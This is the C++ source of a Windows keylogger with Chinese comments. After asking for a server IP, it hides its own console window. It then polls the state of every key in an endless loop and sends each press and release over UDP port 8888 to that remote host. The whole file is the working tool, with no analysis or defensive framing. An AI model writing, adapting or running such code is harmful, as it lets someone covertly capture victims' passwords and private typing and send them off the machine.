#include <iostream>
#include <Windows.h>
#include <WinSock2.h>
 
#pragma comment(lib, "ws2_32.lib")
 
#define PORT 8888
 
int main() {
    WSADATA wsaData;
    SOCKET sockfd;
    sockaddr_in serverAddr;
 
    // 初始化 Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed.\n";
        return 1;
    }
 
    // 创建 socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd == INVALID_SOCKET) {
        std::cerr << "Socket creation failed.\n";
        WSACleanup();
        return 1;
    }
 
    // 获取目标服务器的IP地址
    std::string serverIP;
    std::cout << "Enter the IP address of the server: ";
    std::cin >> serverIP;
	ShowWindow(GetForegroundWindow(),0);
    // 设置服务器地址
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(PORT);
    serverAddr.sin_addr.s_addr = inet_addr(serverIP.c_str());
 
    // 定义按键状态数组
    bool keyState[256] = { false };
 
    // 检测键盘按键并发送到服务器
    while (true) {
        for (int i = 0; i < 256; ++i) {
            bool pressed = (GetAsyncKeyState(i) & 0x8000) != 0;
            if (pressed != keyState[i]) {
                char buffer[2] = { static_cast<char>(i), pressed ? 0 : 1 };
                sendto(sockfd, buffer, sizeof(buffer), 0, (sockaddr*)&serverAddr, sizeof(serverAddr));
                std::cout << "Key " << (pressed ? "pressed" : "released") << ": " << static_cast<char>(i) << std::endl;
            }
            keyState[i] = pressed;
        }
        Sleep(10); // 稍作延时
    }
 
    closesocket(sockfd);
    WSACleanup();
 
    return 0;
}
 
